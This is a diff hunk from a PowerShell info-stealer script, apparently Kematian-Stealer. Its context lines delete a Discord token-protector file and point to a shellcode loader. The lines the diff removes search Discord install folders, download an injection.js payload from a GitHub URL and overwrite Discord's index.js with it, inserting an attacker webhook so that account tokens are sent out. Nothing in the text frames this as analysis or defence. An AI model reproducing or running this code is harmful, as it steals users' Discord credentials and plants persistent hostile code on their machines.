@@ -1074,32 +1074,6 @@ function Backup-Data {
     if ($secure_dat -eq $true) {
         Remove-Item "$env:APPDATA\DiscordTokenProtector\secure.dat" -Force
     }
-
-
-    $locAppData = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
-    $discPaths = @("Discord", "DiscordCanary", "DiscordPTB", "DiscordDevelopment")
-
-    foreach ($path in $discPaths) {
-        $skibidipath = Join-Path $locAppData $path
-        if (-not (Test-Path $skibidipath)) {
-            continue
-        }
-        Get-ChildItem $skibidipath -Recurse | ForEach-Object {
-            if ($_ -is [System.IO.DirectoryInfo] -and ($_.FullName -match "discord_desktop_core")) {
-                $files = Get-ChildItem $_.FullName
-                foreach ($file in $files) {
-                    if ($file.Name -eq "index.js") {
-                        $webClient = New-Object System.Net.WebClient
-                        $content = $webClient.DownloadString("https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/injection.js")
-                        if ($content -ne "") {
-                            $replacedContent = $content -replace "%WEBHOOK%", $webhook
-                            $replacedContent | Set-Content -Path $file.FullName -Force
-                        }
-                    }
-                }
-            }
-        }
-    }
     
     #Shellcode loader, Thanks to https://github.com/TheWover for making this possible !
     
